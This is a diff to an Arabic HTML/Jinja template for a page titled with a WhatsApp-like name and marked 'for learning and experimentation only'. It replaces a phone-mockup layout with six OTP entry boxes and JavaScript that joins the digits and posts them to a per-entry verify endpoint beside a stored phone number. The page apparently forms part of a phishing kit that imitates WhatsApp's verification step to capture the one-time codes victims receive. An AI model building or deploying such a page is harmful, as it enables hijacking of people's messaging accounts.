@@ -1,51 +1,85 @@
 <!doctype html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>واتس حرب</title>
-  <link rel="stylesheet" href="/static/style.css">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link rel="stylesheet" href="/static/style.css">
+<title>واتس حرب</title>
 </head>
-<body class="mobile-page">
-  <main class="phone-shell">
-    <div class="status-bar">
-      <span>9:41</span>
-      <div class="notch"></div>
-      <div class="icons">
-        <span>▮▮▮</span>
-        <span>◔</span>
-        <span>▭</span>
-      </div>
-    </div>
-
-    <section class="mobile-header simple">
+<body class="site-page">
+  <main class="page-shell">
+    <section class="brand-top">
       <h1>واتس حرب</h1>
       <p>للتعلّم والتجريب فقط</p>
     </section>
 
-    <section class="white-card">
-      <h2>أدخل رمز التحقق</h2>
-      <p class="sub">أدخل الرمز المرسل إليك</p>
+    <section class="panel verify-panel">
+      <div class="panel-header">
+        <h2>أدخل رمز التحقق</h2>
+        <p>أدخل الرمز المرسل إليك</p>
+      </div>
 
       {% if request.query_params.get("error") %}
-      <div class="error-box">يرجى إدخال الرمز.</div>
+      <div class="alert error">يرجى إدخال الرمز.</div>
       {% endif %}
 
-      <div class="info-row">
-        <span class="icon">☏</span>
+      <div class="info-box">
         <span>+{{ entry.country_code }} {{ entry.phone }}</span>
       </div>
 
-      <form action="/verify/{{ entry.id }}" method="post" class="stack">
-        <div class="otp-grid">
-          <input class="otp-input" type="text" name="code" maxlength="6" placeholder="" required>
+      <form action="/verify/{{ entry.id }}" method="post" class="form-stack" id="otpForm">
+        <input type="hidden" name="code" id="fullCode">
+
+        <div class="otp-row" dir="ltr">
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
+          <input class="otp-box" type="text" inputmode="numeric" maxlength="1" autocomplete="off">
         </div>
-        <button class="green-btn" type="submit">تحقق</button>
+
+        <button class="btn-primary" type="submit">تحقق</button>
       </form>
     </section>
-
-    <div class="wave"></div>
-    <div class="home-indicator"></div>
   </main>
+
+  <script>
+    const boxes = Array.from(document.querySelectorAll('.otp-box'));
+    const fullCode = document.getElementById('fullCode');
+    const form = document.getElementById('otpForm');
+
+    boxes.forEach((box, index) => {
+      box.addEventListener('input', () => {
+        box.value = box.value.replace(/\D/g, '').slice(0, 1);
+        if (box.value && index < boxes.length - 1) boxes[index + 1].focus();
+      });
+
+      box.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !box.value && index > 0) boxes[index - 1].focus();
+        if (e.key === 'ArrowLeft' && index > 0) boxes[index - 1].focus();
+        if (e.key === 'ArrowRight' && index < boxes.length - 1) boxes[index + 1].focus();
+      });
+
+      box.addEventListener('paste', (e) => {
+        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
+        if (!pasted) return;
+        e.preventDefault();
+        pasted.split('').forEach((char, i) => {
+          if (boxes[i]) boxes[i].value = char;
+        });
+        boxes[Math.min(pasted.length, boxes.length - 1)].focus();
+      });
+    });
+
+    form.addEventListener('submit', (e) => {
+      const code = boxes.map(b => b.value).join('');
+      fullCode.value = code;
+      if (!code) {
+        e.preventDefault();
+        alert('يرجى إدخال الرمز');
+      }
+    });
+  </script>
 </body>
 </html>
